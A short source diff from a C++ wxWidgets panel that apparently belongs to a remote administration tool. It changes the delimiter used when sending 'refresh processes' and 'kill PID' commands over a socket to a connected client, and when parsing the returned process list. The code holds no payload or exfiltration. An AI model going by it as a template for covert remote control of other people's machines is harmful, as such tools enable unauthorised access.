@@ -53,7 +53,7 @@ void panelProcessManager::CrearListview() {
 void ListCtrlManager2::OnRefrescar(wxCommandEvent& event) {
 	this->DeleteAllItems();
 	std::string strComando = std::to_string(EnumComandos::PM_Refrescar);
-	strComando.append(1, '~');
+	strComando.append(1, CMD_DEL);
 	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
 	return;
 }
@@ -61,7 +61,7 @@ void ListCtrlManager2::OnRefrescar(wxCommandEvent& event) {
 void ListCtrlManager2::OnTerminarPID(wxCommandEvent& event) {
 	long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
 	std::string strComando = std::to_string(EnumComandos::PM_Kill);
-	strComando.append(1, '~');
+	strComando.append(1, CMD_DEL);
 	strComando += this->GetItemText(item, 0);
 	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
 	return;
@@ -72,7 +72,7 @@ void ListCtrlManager2::AgregarData(std::string strBuffer, std::string _strPID){
 	std::vector<std::string> vc_Proc = strSplit(strBuffer, '|', 1000);
 	int iCount = 0;
 	for (auto aProceso : vc_Proc) {
-		std::vector<std::string> vc_Detail = strSplit(aProceso, '~', 3);
+		std::vector<std::string> vc_Detail = strSplit(aProceso, '>', 3);
 		if (vc_Detail.size() == 3) {
 			this->InsertItem(iCount, vc_Detail[0]);
 			this->SetItem(iCount, 1, vc_Detail[1]);
